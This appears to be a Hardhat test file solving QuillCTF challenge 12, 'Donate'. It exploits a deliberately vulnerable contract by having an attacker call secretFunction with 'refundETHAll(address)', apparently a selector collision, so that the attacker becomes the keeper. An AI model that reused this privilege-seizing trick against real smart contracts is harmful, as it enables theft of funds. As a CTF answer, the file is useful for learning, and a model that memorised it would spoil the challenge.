import {expect} from 'chai';
import {ethers} from 'hardhat';
import {SignerWithAddress} from '@nomiclabs/hardhat-ethers/signers';
import {Donate} from '../../types/typechain';

describe('QuillCTF: 12. Donate', () => {
  let owner: SignerWithAddress;
  let attacker: SignerWithAddress;
  let keeper: SignerWithAddress;

  let contract: Donate;

  before(async () => {
    [owner, attacker, keeper] = await ethers.getSigners();
    contract = await ethers.getContractFactory('Donate', owner).then(f => f.deploy(keeper.address));
    await contract.deployed();
  });

  it('should hack and become the keeper', async () => {
    await contract.connect(attacker).secretFunction('refundETHAll(address)');
  });

  after(async () => {
    // should call keeperCheck
    await contract.keeperCheck();
    expect(await contract.keeper()).to.eq(attacker.address);
  });
});
